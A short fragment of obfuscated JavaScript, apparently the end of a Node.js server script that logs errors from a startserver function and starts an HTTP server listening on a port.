AddVisitTask();}catch(_0x873886){console[_0x3ef81b(0x13d)]('Error\x20in\x20startserver:',_0x873886);}}startserver()[_0x2d5908(0x132)](_0x471627=>{const _0x5bbc6b=_0x2d5908;console[_0x5bbc6b(0x13d)]('Unhandled\x20error\x20in\x20startserver:',_0x471627);}),app['listen'](PORT,()=>console[_0x2d5908(0x11b)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
